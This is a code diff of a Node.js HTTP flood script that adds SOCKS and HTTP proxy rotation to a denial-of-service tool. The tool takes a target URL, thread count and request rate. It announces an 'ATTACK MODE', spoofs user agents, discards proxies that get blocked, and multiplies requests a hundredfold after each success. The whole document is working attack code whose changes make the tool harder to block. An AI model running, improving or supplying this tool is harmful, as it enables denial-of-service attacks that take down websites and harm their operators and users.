@@ -1,14 +1,15 @@
 require('events').EventEmitter.defaultMaxListeners = 0;
 const request = require('request'),
-      fs = require('fs'),
-      fakeUa = require('fake-useragent'),
-      cluster = require('cluster');
+    fs = require('fs'),
+    { SocksProxyAgent } = require('socks-proxy-agent'),
+    fakeUa = require('fake-useragent'),
+    cluster = require('cluster');
 
-let totalSent = 0; // Biến đếm số request gửi thành công
+let totalSent = 0;
 
 async function main_process() {
     if (process.argv.length !== 7) {
-        console.log(`Usage: node duoc.js <URL> <TIME> <THREADS> <bypass | proxy.txt> <RATE>`);
+        console.log(`Usage: node duoc_full_proxy.js <URL> <TIME> <THREADS> <bypass | proxy.txt> <RATE>`);
         process.exit(0);
     }
 
@@ -33,13 +34,21 @@ async function main_process() {
     if (proxyMode === 'bypass') {
         console.log("ATTACK MODE: BYPASS (no proxy)");
     } else {
-        console.log(`ATTACK MODE: HTTP_PROXY from file: ${proxyMode}`);
+        console.log(`ATTACK MODE: USING PROXIES from file: ${proxyMode}`);
         try {
             const data = fs.readFileSync(proxyMode, 'utf-8');
             proxies = data.replace(/\r/g, '').split('\n').filter(p => p.trim() !== '');
         } catch (err) {
             console.error("Could not read proxy file:", err.message);
             process.exit(1);
+        }
+    }
+
+    function createAgent(proxy) {
+        if (proxy.startsWith('socks4://') || proxy.startsWith('socks5://')) {
+            return new SocksProxyAgent(proxy);
+        } else {
+            return proxy.startsWith('http://') ? proxy : 'http://' + proxy;
         }
     }
 
@@ -59,29 +68,43 @@ async function main_process() {
                 process.exit(0);
             }
 
-            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-            const proxiedRequest = request.defaults({ 'proxy': 'http://' + proxy });
+            const rawProxy = proxies[Math.floor(Math.random() * proxies.length)];
+            const proxy = rawProxy.includes('://') ? rawProxy : 'http://' + rawProxy;
+            const agent = createAgent(proxy);
 
-            proxiedRequest(config, function (error, response) {
+            let requestOptions = {
+                url: config.url,
+                method: config.method,
+                headers: config.headers
+            };
+
+            if (typeof agent === 'string') {
+                requestOptions.proxy = agent;
+            } else {
+                requestOptions.agent = agent;
+            }
+
+            request(requestOptions, function (error, response) {
                 if (error || !response) {
-                    console.warn(`[${proxy}] ERROR: ${error ? error.code : 'No response'} → switching proxy`);
-                    proxies = proxies.remove_by_value(proxy);
-                    return run(); // Retry với proxy khác
+                    console.warn(`[${rawProxy}] ERROR: ${error ? error.code : 'No response'} → switching proxy`);
+                    proxies = proxies.remove_by_value(rawProxy);
+                    return run();
                 }
 
-                console.log(response.statusCode, "HTTP_PROXY");
+                console.log(response.statusCode, rawProxy);
 
                 if (response.statusCode >= 200 && response.statusCode <= 226) {
-                    totalSent += 1;
+                    totalSent++;
                     for (let i = 0; i < 100; i++) {
-                        proxiedRequest(config, () => totalSent++);
+                        request(requestOptions, () => totalSent++);
                     }
                 } else {
-                    console.warn(`[${proxy}] BLOCKED with status ${response.statusCode} → removing`);
-                    proxies = proxies.remove_by_value(proxy);
-                    return run(); // Retry với proxy khác
+                    console.warn(`[${rawProxy}] BLOCKED with status ${response.statusCode} → removing`);
+                    proxies = proxies.remove_by_value(rawProxy);
+                    return run();
                 }
             });
+
         } else {
             request(config, function (error, response) {
                 if (response && response.statusCode >= 200 && response.statusCode <= 226) {
@@ -97,7 +120,7 @@ async function main_process() {
             for (let i = 0; i < rate; i++) {
                 run();
             }
-        }, 1000); // Gửi <rate> request mỗi giây
+        }, 1000);
     }
 
     async function main() {
@@ -111,7 +134,6 @@ async function main_process() {
                 cluster.fork();
             });
 
-            // In thống kê mỗi 5 giây
             setInterval(() => {
                 console.log(`[STATS] Requests sent: ${totalSent}`);
             }, 5000);
